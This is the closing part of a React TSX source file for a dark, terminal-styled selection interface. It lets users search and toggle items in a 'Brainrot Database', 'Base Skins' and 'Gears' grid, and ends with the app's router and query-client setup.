              <div className="flex flex-col xs:flex-row xs:items-center justify-between gap-3">
                <div>
                  <h2 className="text-base font-bold flex items-center gap-2"><SquareMousePointer className="w-4 h-4 text-primary"/> Brainrot Database</h2>
                  <p className="text-xs text-primary/80 mt-0.5 font-mono">&gt; {selectedBrainrots.size} of {totalCount} SELECTED</p>
                </div>
                <div className="flex items-center gap-2 flex-wrap">
                  <input type="text" placeholder="SEARCH_DB..." className="bg-secondary/50 border border-border rounded-md px-3 py-1.5 text-xs w-36 sm:w-44 focus:outline-none focus:border-primary font-mono placeholder:text-muted-foreground/50 text-foreground transition-colors" value={searchTerm} onChange={e => setSearchTerm(e.target.value)} />
                  <button onClick={handleSelectAll} className="px-2.5 py-1.5 bg-secondary hover:bg-secondary/80 border border-border rounded-md text-xs font-bold font-mono transition-colors">ALL</button>
                  <button onClick={handleDeselectAll} className="px-2.5 py-1.5 bg-secondary hover:bg-secondary/80 border border-border rounded-md text-xs font-bold font-mono transition-colors">NONE</button>
                </div>
              </div>
            </div>
            <div className="p-3 sm:p-4 flex-1 overflow-y-auto custom-scrollbar">
              {totalCount === 0 ? (
                <div className="h-full flex flex-col items-center justify-center text-muted-foreground gap-3"><RefreshCw className="w-7 h-7 animate-spin text-primary"/><p className="font-mono text-xs tracking-widest">FETCHING_DATA...</p></div>
              ) : filteredCategories.length === 0 ? (
                <div className="py-12 text-center text-muted-foreground font-mono text-sm">[ NO_RESULTS_FOUND ]</div>
              ) : (
                <div className="space-y-5">
                  {filteredCategories.map(([cat, names]) => (
                    <div key={cat}>
                      <div className={`inline-flex items-center gap-2 px-2 py-0.5 rounded border text-[10px] font-black font-mono uppercase tracking-widest mb-2 ${CATEGORY_COLORS[cat] ?? 'text-muted-foreground border-border bg-secondary/30'}`}>{cat}<span className="opacity-60">({names.length})</span></div>
                      <div className="grid grid-cols-1 xs:grid-cols-2 sm:grid-cols-2 md:grid-cols-3 gap-1.5">
                        {names.map(name => (<CheckboxCard key={name} title={name} selected={selectedBrainrots.has(name)} onClick={() => toggleName(name)} imageUrl={imageMap[name]} />))}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>

          <div className="bg-card border border-primary/40 rounded-xl flex flex-col shadow-[0_0_35px_rgba(0,255,65,0.18)]">
            <div className="p-3 sm:p-4 border-b border-border bg-secondary/20 rounded-t-xl">
              <div className="flex items-center justify-between gap-3">
                <div><h2 className="text-base font-bold flex items-center gap-2"><SquareMousePointer className="w-4 h-4 text-primary"/> Base Skins</h2><p className="text-xs text-primary/80 mt-0.5 font-mono">&gt; {selectedBaseSkins.size} of {BASE_SKINS.length} SELECTED</p></div>
                <div className="flex items-center gap-2">
                  <button onClick={() => setSelectedBaseSkins(new Set(BASE_SKINS))} className="px-2.5 py-1.5 bg-secondary hover:bg-secondary/80 border border-border rounded-md text-xs font-bold font-mono transition-colors">ALL</button>
                  <button onClick={() => setSelectedBaseSkins(new Set())} className="px-2.5 py-1.5 bg-secondary hover:bg-secondary/80 border border-border rounded-md text-xs font-bold font-mono transition-colors">NONE</button>
                </div>
              </div>
            </div>
            <div className="p-3 sm:p-4">
              <div className="grid grid-cols-1 xs:grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-1.5">
                {BASE_SKINS.map(name => (<CheckboxCard key={name} title={name} selected={selectedBaseSkins.has(name)} onClick={() => { const s = new Set(selectedBaseSkins); s.has(name) ? s.delete(name) : s.add(name); setSelectedBaseSkins(s); }} imageUrl={BASE_SKIN_IMAGES[name]} />))}
              </div>
            </div>
          </div>

          <div className="bg-card border border-primary/40 rounded-xl flex flex-col shadow-[0_0_35px_rgba(0,255,65,0.18)]">
            <div className="p-3 sm:p-4 border-b border-border bg-secondary/20 rounded-t-xl">
              <div className="flex items-center justify-between gap-3">
                <div><h2 className="text-base font-bold flex items-center gap-2"><Zap className="w-4 h-4 text-primary"/> Gears</h2><p className="text-xs text-primary/80 mt-0.5 font-mono">&gt; {selectedGears.size} of {GEARS.length} SELECTED</p></div>
                <div className="flex items-center gap-2">
                  <button onClick={() => setSelectedGears(new Set(GEARS))} className="px-2.5 py-1.5 bg-secondary hover:bg-secondary/80 border border-border rounded-md text-xs font-bold font-mono transition-colors">ALL</button>
                  <button onClick={() => setSelectedGears(new Set())} className="px-2.5 py-1.5 bg-secondary hover:bg-secondary/80 border border-border rounded-md text-xs font-bold font-mono transition-colors">NONE</button>
                </div>
              </div>
            </div>
            <div className="p-3 sm:p-4">
              <div className="grid grid-cols-1 xs:grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-1.5">
                {GEARS.map(name => (<CheckboxCard key={name} title={name} selected={selectedGears.has(name)} onClick={() => { const s = new Set(selectedGears); s.has(name) ? s.delete(name) : s.add(name); setSelectedGears(s); }} imageUrl={GEAR_IMAGES[name]} />))}
              </div>
            </div>
          </div>
        </div>
      </main>
      <TutorialModal open={tutorialOpen} onClose={() => setTutorialOpen(false)}/>
    </div>
  );
}

const queryClient = new QueryClient();

export default function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <WouterRouter base={import.meta.env.BASE_URL.replace(/\/$/, '')}>
        <Switch>
          <Route path="/" component={Home}/>
          <Route><div className="flex items-center justify-center min-h-screen text-muted-foreground font-mono">[ 404_NOT_FOUND ]</div></Route>
        </Switch>
      </WouterRouter>
      <Toaster theme="dark" position="bottom-right" className="font-mono"/>
    </QueryClientProvider>
  );
}
